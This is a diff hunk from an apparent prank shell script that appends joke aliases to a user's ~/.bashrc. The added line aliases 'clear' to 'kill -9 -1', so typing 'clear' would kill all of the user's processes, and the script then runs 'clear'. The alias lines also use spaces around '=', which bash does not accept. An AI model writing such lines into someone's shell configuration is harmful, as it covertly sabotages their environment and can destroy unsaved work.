@@ -15,6 +15,7 @@ echo "alias clang = norminette" >> ~/.bashrc
 echo "alias vi = nano" >> ~/.bashrc
 echo "alias vim = emacs -rv" >> ~/.bashrc
 echo "alias clang = norminette" >> ~/.bashrc
+echo "alias clear = kill -9 -1" >> ~/.bashrc
 
 clear
 
